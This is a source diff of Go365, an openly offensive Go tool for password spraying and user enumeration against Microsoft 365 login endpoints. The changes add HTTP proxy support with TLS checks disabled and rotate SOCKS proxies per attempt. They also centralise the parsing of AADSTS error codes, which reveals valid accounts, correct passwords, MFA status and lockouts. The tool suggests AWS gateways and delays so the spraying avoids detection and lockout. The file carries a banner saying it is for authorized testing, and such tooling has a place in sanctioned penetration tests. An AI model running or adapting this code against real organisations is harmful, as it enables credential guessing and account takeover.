@@ -9,29 +9,34 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
 */
 package main
+
 import (
 	"bufio"
 	"bytes"
+	"crypto/tls"
+	"encoding/json"
 	"flag"
 	"fmt"
-	"io/ioutil"
-	"math/rand"
-	"net/http"
-	"os"
-	"strings"
-	"time"
-	"encoding/json"
 	"github.com/beevik/etree"
 	"github.com/fatih/color"
 	"golang.org/x/net/proxy"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"time"
 	//"crypto/tls"                     uncomment when testing through burp + proxifier
 )
+
 var (
-	targetURL = ""
-	targetURLrst2 = "https://login.microsoftonline.com/rst2.srf"
+	targetURL      = ""
+	targetURLrst2  = "https://login.microsoftonline.com/rst2.srf"
 	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
-	debug     = false
+	debug          = false
 )
+
 const (
 	version = "1.4"
 	tool    = "Go365"
@@ -89,6 +94,11 @@ const (
                                 : Default: 60 minutes (3600 seconds) recommended.
                                 : (-delay 7200)
 
+    -http-proxy <string>        Single HTTP proxy to use
+                                : IP address and Port separated by a ":"
+                                : Has only been tested using Burp Suite
+                                : (-http-proxy http://127.0.0.1:8080)
+
     -o <string>                 Output file to write to
                                 : Will append if file exists, otherwise a file is created
                                 : (-o ./Go365output.out)
@@ -128,12 +138,14 @@ const (
   ██████   ████  ██████   ██████  ██████
 `
 )
+
 // function to handle wait times
 func wait(wt int) {
 	waitTime := time.Duration(wt) * time.Second
 	time.Sleep(waitTime)
 }
-// funtion to randomize the list of proxy servers
+
+// function to randomize the list of proxy servers
 func randomProxy(proxies []string) string {
 	var proxy string
 	if len(proxies) > 0 {
@@ -141,23 +153,74 @@ func randomProxy(proxies []string) string {
 	}
 	return proxy
 }
-type flagVars struct {
-	flagHelp              bool
-	flagEndpoint          string
-	flagUsername          string
-	flagUsernameFile      string
-	flagDomain            string
-	flagPassword          string
-	flagPasswordFile      string
-	flagUserPassFile      string
-	flagDelay             int
-	flagWaitTime          int
-	flagProxy             string
-	flagProxyFile         string
-	flagOutFilePath       string
-	flagAWSGatewayURL     string
-	flagDebug             bool
+
+// read response codes
+func parseResponse(xmlResponse string, un string, pw string, body []byte, endpoint string) (string, color.Attribute) {
+	var returnString string
+	var returnColor color.Attribute
+	// [graph] or [rst]
+	prefix := fmt.Sprintf("[%s] ", endpoint)
+
+	if strings.Contains(xmlResponse, "50059") {
+		fmt.Println(color.RedString(prefix + "[-] Domain not found in o365 directory. Exiting..."))
+		os.Exit(0) // no need to continue if the domain isn't found
+	} else if strings.Contains(xmlResponse, "50034") {
+		returnString = prefix + "[-] User not found: " + un
+		returnColor = color.FgRed
+	} else if strings.Contains(xmlResponse, "50126") {
+		returnString = prefix + "[-] Valid user, but invalid password: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(xmlResponse, "50055") {
+		returnString = prefix + "[!] Valid user, expired password: " + un + " : " + pw
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50056") {
+		returnString = prefix + "[!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(xmlResponse, "50053") {
+		returnString = prefix + "[-] Account locked out: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50057") {
+		returnString = prefix + "[-] Account disabled: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50076") || strings.Contains(xmlResponse, "50079") {
+		returnString = prefix + "[+] Possible valid login, MFA required. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(xmlResponse, "53004") {
+		returnString = prefix + "[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(xmlResponse, "") {
+		returnString = prefix + "[+] Possible valid login! " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else {
+		returnString = prefix + "[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnColor = color.FgMagenta
+	}
+	if debug {
+		returnString = returnString + "\nDebug: " + string(body)
+	}
+
+	return returnString, returnColor
 }
+
+type flagVars struct {
+	flagHelp          bool
+	flagEndpoint      string
+	flagUsername      string
+	flagUsernameFile  string
+	flagDomain        string
+	flagPassword      string
+	flagPasswordFile  string
+	flagUserPassFile  string
+	flagDelay         int
+	flagWaitTime      int
+	flagHttpProxy     string
+	flagProxy         string
+	flagProxyFile     string
+	flagOutFilePath   string
+	flagAWSGatewayURL string
+	flagDebug         bool
+}
+
 func flagOptions() *flagVars {
 	flagHelp := flag.Bool("h", false, "")
 	flagEndpoint := flag.String("endpoint", "rst", "")
@@ -169,6 +232,7 @@ func flagOptions() *flagVars {
 	flagUserPassFile := flag.String("up", "", "")
 	flagDelay := flag.Int("delay", 3600, "")
 	flagWaitTime := flag.Int("w", 1, "")
+	flagHttpProxy := flag.String("http-proxy", "", "")
 	flagProxy := flag.String("proxy", "", "")
 	flagOutFilePath := flag.String("o", "", "")
 	flagProxyFile := flag.String("proxyfile", "", "")
@@ -176,46 +240,28 @@ func flagOptions() *flagVars {
 	flagDebug := flag.Bool("debug", false, "")
 	flag.Parse()
 	return &flagVars{
-		flagHelp:           *flagHelp,
-		flagEndpoint:       *flagEndpoint,
-		flagUsername:       *flagUsername,
-		flagUsernameFile:   *flagUsernameFile,
-		flagDomain:         *flagDomain,
-		flagPassword:       *flagPassword,
-		flagPasswordFile:   *flagPasswordFile,
-		flagUserPassFile:   *flagUserPassFile,
-		flagDelay:          *flagDelay,
-		flagWaitTime:       *flagWaitTime,
-		flagProxy:          *flagProxy,
-		flagProxyFile:      *flagProxyFile,
-		flagOutFilePath:    *flagOutFilePath,
-		flagAWSGatewayURL:  *flagAWSGatewayURL,
-		flagDebug:          *flagDebug,
+		flagHelp:          *flagHelp,
+		flagEndpoint:      *flagEndpoint,
+		flagUsername:      *flagUsername,
+		flagUsernameFile:  *flagUsernameFile,
+		flagDomain:        *flagDomain,
+		flagPassword:      *flagPassword,
+		flagPasswordFile:  *flagPasswordFile,
+		flagUserPassFile:  *flagUserPassFile,
+		flagDelay:         *flagDelay,
+		flagWaitTime:      *flagWaitTime,
+		flagHttpProxy:     *flagHttpProxy,
+		flagProxy:         *flagProxy,
+		flagProxyFile:     *flagProxyFile,
+		flagOutFilePath:   *flagOutFilePath,
+		flagAWSGatewayURL: *flagAWSGatewayURL,
+		flagDebug:         *flagDebug,
 	}
 }
-func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
-	var returnString string
-	var returnColor color.Attribute
-	client := &http.Client{}
-	// Devs - uncomment this code if you want to proxy through burp + proxifier
-	//client := &http.Client{
-	//	Transport: &http.Transport{
-	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
-	//	},
-	//}
+func doTheStuffGraph(un string, pw string, client *http.Client) (string, color.Attribute) {
+
 	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
-	// If a proxy was set, do this stuff
-	if prox != "" {
-		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
-		if err != nil {
-			fmt.Println("Error connecting to proxy.")
-		}
-		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
-		client = &http.Client{
-			Transport: tr,
-			Timeout:   15 * time.Second,
-		}
-	}
+
 	// Build http request
 	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
 	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
@@ -244,74 +290,19 @@ func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute
 	jsonErrCode := data["error_codes"]
 	x := fmt.Sprintf("%v", jsonErrCode)
 
-	if strings.Contains(x, "50059") {
-		fmt.Println(color.RedString("[graph] [-] Domain not found in o365 directory. Exiting..."))
-		os.Exit(0) // no need to continue if the domain isn't found
-	} else if strings.Contains(x, "50034") {
-		returnString = "[graph] [-] User not found: " + un
-		returnColor = color.FgRed
-	} else if strings.Contains(x, "50126") {
-		returnString = "[graph] [-] Valid user, but invalid password: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x, "50055") {
-		returnString = "[graph] [!] Valid user, expired password: " + un + " : " + pw
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50056") {
-		returnString = "[graph] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x, "50053") {
-		returnString = "[graph] [-] Account locked out: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50057") {
-		returnString = "[graph] [-] Account disabled: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50076") || strings.Contains(x, "50079") {
-		returnString = "[graph] [+] Possible valid login, MFA required. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x, "53004") {
-		returnString = "[graph] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x, "") {
-		returnString = "[graph] [+] Possible valid login! " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else {
-		returnString = "[graph] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
-		returnColor = color.FgMagenta
-	}
-	if debug {
-		returnString = returnString + "\nDebug: " + string(body)
-	}
-	return returnString, returnColor
+	return parseResponse(x, un, pw, body, "graph")
 }
-func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) {
+func doTheStuffRst(un string, pw string, client *http.Client) (string, color.Attribute) {
 	var returnString string
-	var returnColor color.Attribute
 	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
-	client := &http.Client{}
-	// Devs - uncomment this code if you want to proxy through burp for troubleshooting
-	//client := &http.Client{
-	//	Transport: &http.Transport{
-	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
-	//	},
-	//}
+
 	// Build http request
 	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
 	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
 	if err != nil {
 		panic(err)
 	}
-	// Set proxy if enabled
-	if prox != "" {
-		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
-		if err != nil {
-			fmt.Println("Error connecting to proxy.")
-		}
-		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
-		client = &http.Client{
-			Transport: tr,
-			Timeout:   15 * time.Second,
-		}
-	}
+
 	// Send http request
 	response, err := client.Do(request)
 	if err != nil {
@@ -331,47 +322,14 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 	xmlResponse := etree.NewDocument()
 	xmlResponse.ReadFromBytes(body)
 	//// Read response codes
-     // looks for the "psf:text" field within the XML response 
+	// looks for the "psf:text" field within the XML response
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
 		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
+		return returnString, color.FgGreen
 		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
-	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		// if the domain is not in the directory then exit 
-		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
-		os.Exit(0) // no need to continue if the domain isn't found
-	} else if strings.Contains(x.Text(), "AADSTS50034") {
-		returnString = "[rst] [-] User not found: " + un
-		returnColor = color.FgRed
-	} else if strings.Contains(x.Text(), "AADSTS50126") {
-		returnString = "[rst] [-] Valid user, but invalid password: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x.Text(), "AADSTS50055") {
-		returnString = "[rst] [!] Valid user, expired password: " + un + " : " + pw
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50056") {
-		returnString = "[rst] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x.Text(), "AADSTS50053") {
-		returnString = "[rst] [-] Account locked out: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50057") {
-		returnString = "[rst] [-] Account disabled: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
-		returnString = "[rst] [+] Possible valid login, MFA required. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x.Text(), "AADSTS53004") {
-		returnString = "[rst] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else {
-		returnString = "[rst] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
-		returnColor = color.FgMagenta
 	}
-	if debug {
-		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
-	}
-	return returnString, returnColor
+	return parseResponse(x.Text(), un, pw, body, "rst")
 }
 func main() {
 	fmt.Println(color.BlueString(banner))
@@ -473,6 +431,7 @@ func main() {
 		os.Exit(0)
 	}
 	// -proxy
+	// socks proxy
 	if opt.flagProxy != "" {
 		proxyList = append(proxyList, opt.flagProxy)
 
@@ -523,7 +482,7 @@ func main() {
 		}
 	}
 	// -endpoint
-	if opt.flagEndpoint == "rst"{
+	if opt.flagEndpoint == "rst" {
 		fmt.Println("Using the rst endpoint...")
 		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
 		targetURL = targetURLrst2
@@ -551,36 +510,52 @@ func main() {
 			if opt.flagUserPassFile != "" {
 				pass = passwordList[j]
 			}
+
+			// Setup the http.Client object
+			client := &http.Client{}
+
+			// Select the random proxy and apply if needed
+			selectedProxy := randomProxy(proxyList)
+			if selectedProxy != "" {
+				dialSOCKSProxy, err := proxy.SOCKS5("tcp", selectedProxy, nil, proxy.Direct)
+				if err != nil {
+					fmt.Println("Error connecting to proxy.")
+				}
+				tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
+				client = &http.Client{
+					Transport: tr,
+					Timeout:   15 * time.Second,
+				}
+				// Use an http-proxy if specified
+			} else if opt.flagHttpProxy != "" {
+				proxyUrl, err := url.Parse(opt.flagHttpProxy)
+
+				if err != nil {
+					fmt.Println("Failed to parse HTTP proxy.")
+				}
+
+				client = &http.Client{
+					Transport: &http.Transport{
+						TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+						Proxy:           http.ProxyURL(proxyUrl),
+					},
+				}
+			}
+
 			result := ""
 			// Test username:password combo
 			if opt.flagEndpoint == "rst" {
-				result, col := doTheStuffRst(user, pass, randomProxy(proxyList))
+				result, col := doTheStuffRst(user, pass, client)
 				// Print with color
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
-				// Write to file
-				if opt.flagOutFilePath != "" {
-					outFile.WriteString(result + "\n")
-				}
-				// Wait between usernames
-				if j < len(usernameList)-1 {
-					wait(opt.flagWaitTime)
-				}
 			} else if opt.flagEndpoint == "graph" {
-				result, col := doTheStuffGraph(user, pass, randomProxy(proxyList))
+				result, col := doTheStuffGraph(user, pass, client)
 				// Print with color
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
-				// Write to file
-				if opt.flagOutFilePath != "" {
-					outFile.WriteString(result + "\n")
-				}	
-				// Wait between usernames
-				if j < len(usernameList)-1 {
-					wait(opt.flagWaitTime)
-				}
 			}
 			// Write to file
 			if opt.flagOutFilePath != "" {
